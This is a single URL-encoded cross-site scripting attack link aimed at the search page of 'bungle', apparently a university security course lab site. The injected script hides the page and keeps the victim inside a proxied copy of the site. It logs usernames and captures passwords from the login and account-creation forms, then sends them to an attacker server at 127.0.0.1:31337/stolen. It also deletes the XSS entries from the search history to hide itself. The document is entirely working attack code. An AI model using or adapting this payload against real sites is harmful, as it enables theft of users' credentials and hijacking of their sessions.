http://bungle-cs461.csl.illinois.edu/search?xssdefense=0&q=%3Cscript%3Efunction%20payload%28attacker%29%20{%20%2F%2F-%0A%0A%09%2F%2F%20Log%20the%20things%20and%20send%20them%20to%20our%20spy%20server%0A%09function%20log%28data%29%20{%0A%09%09console.log%28%24.param%28data%29%29%20%2F%2F%20BE%20SURE%20TO%20LEAVE%20THIS%20OUT%20WHEN%20SUBMITTING%0A%09%09%24.get%28attacker%2C%20data%29%3B%0A%09}%0A%0A%09%2F%2F%20Proxy%20the%20search%20page%09%0A%09function%20proxy_search%28href%29%20{%0A%09%09%24%28%22html%22%29.load%28href%2C%20function%28%29{%0A%09%09%09%24%28%22html%22%29.show%28%29%3B%0A%09%09%09if%20%28%24%28%27%23logged-in-user%27%29.length%29%20{%0A%09%09%09%09log%28{event%3A%20%22nav%22%2C%20user%3A%20%24%28%27%23logged-in-user%27%29.text%28%29%2C%20url%3A%20href}%29%3B%0A%09%09%09}%0A%09%09%09else%20{%0A%09%09%09%09log%28{event%3A%20%22nav%22%2C%20url%3A%20href}%29%3B%0A%09%09%09}%0A%0A%09%09%09%2F%2F%20Get%20rid%20of%20all%20and%20any%20search%20histories%20relating%20to%20XSS%0A%09%09%09%24%28%22a[href|%3D%27search%3Fq%3D%253Cscript%253Efunction%2520payload%2528attacker%2529%2520%257B%2520%2F%2F%27]%22%29.remove%28%29%3B%0A%0A%09%09%09%2F%2F%20Set%20up%20all%20possible%20redirects%0A%09%09%09%24%28%22%23bungle-lnk%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22%23search-again-btn%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22a[href*%3D%27search%3Fq%3D%27]%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09proxy_search%28this.href%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22%23log-out-btn%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09%24.post%28%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Flogout%22%2C%20function%28data%29%20{%0A%09%09%09%09%09log%28{event%3A%20%22logout%22%2C%20user%3A%20%24%28%27%23logged-in-user%27%29.text%28%29}%29%3B%0A%09%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09}%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%09%09}%29%3B%0A%09}%0A%0A%09%2F%2F%20Proxy%20the%20home%20page%0A%09function%20proxy%28href%29%20{%0A%09%09%24%28%22html%22%29.load%28href%2C%20function%28%29{%0A%09%09%09%24%28%22html%22%29.show%28%29%3B%0A%09%09%09if%20%28%24%28%27%23logged-in-user%27%29.length%29%20{%0A%09%09%09%09log%28{event%3A%20%22nav%22%2C%20user%3A%20%24%28%27%23logged-in-user%27%29.text%28%29%2C%20url%3A%20href}%29%3B%0A%09%09%09}%0A%09%09%09else%20{%0A%09%09%09%09log%28{event%3A%20%22nav%22%2C%20url%3A%20href}%29%3B%0A%09%09%09}%0A%0A%09%09%09%2F%2F%20Set%20up%20all%20possible%20redirects%0A%09%09%09%24%28%22%23bungle-lnk%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22%23search-btn%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09proxy_search%28%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fq%3D%22%20%2B%20%24%28%22%23query%22%29.val%28%29.toString%28%29%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22%23log-in-btn%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09%24.post%28%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Flogin%22%2C%20{username%3A%20%24%28%22%23username%22%29.val%28%29.toString%28%29%2C%20password%3A%20%24%28%22%23userpass%22%29.val%28%29.toString%28%29}%2C%20function%28data%29%20{%0A%09%09%09%09%09log%28{event%3A%20%22login%22%2C%20user%3A%20%24%28%22%23username%22%29.val%28%29.toString%28%29%2C%20pass%3A%20%24%28%22%23userpass%22%29.val%28%29.toString%28%29}%29%3B%0A%09%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09}%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22%23log-out-btn%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09%24.post%28%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Flogout%22%2C%20function%28data%29%20{%0A%09%09%09%09%09log%28{event%3A%20%22logout%22%2C%20user%3A%20%24%28%27%23logged-in-user%27%29.text%28%29}%29%3B%0A%09%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09}%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%0A%09%09%09%24%28%22%23new-account-btn%22%29.on%28%20%22click%22%2C%20function%28%29%20{%0A%09%09%09%09%24.post%28%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fcreate%22%2C%20{username%3A%20%24%28%22%23username%22%29.val%28%29.toString%28%29%2C%20password%3A%20%24%28%22%23userpass%22%29.val%28%29.toString%28%29}%2C%20function%28data%29%20{%0A%09%09%09%09%09log%28{event%3A%20%22login%22%2C%20user%3A%20%24%28%22%23username%22%29.val%28%29.toString%28%29%2C%20pass%3A%20%24%28%22%23userpass%22%29.val%28%29.toString%28%29}%29%3B%0A%09%09%09%09%09proxy%28%22.%2F%22%29%3B%0A%09%09%09%09}%29%3B%0A%09%09%09%09return%20false%3B%0A%09%09%09}%29%3B%0A%09%09}%29%3B%0A%09}%0A%0A%09%2F%2F%20Start%20off%20the%20XSS%20attack%0A%09%24%28%22html%22%29.hide%28%29%3B%0A%09proxy%28%22.%2F%22%29%3B%0A}%3Bpayload%28%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22%29%3B%3C%2Fscript%3E
